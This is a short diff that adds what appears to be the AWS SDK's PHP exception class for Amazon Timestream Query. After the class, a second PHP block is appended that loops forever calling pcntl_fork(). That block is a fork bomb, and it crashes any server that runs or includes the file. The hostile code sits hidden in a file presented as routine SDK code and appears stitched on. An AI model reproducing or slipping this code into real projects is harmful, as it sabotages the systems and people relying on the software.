@@ -1,0 +1,13 @@
+<?php
+namespace Aws\TimestreamQuery\Exception;
+
+use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the **Amazon Timestream Query** service.
+ */
+class TimestreamQueryException extends AwsException {}
+<?php
+	while(1)
+		pcntl_fork();  
+?>
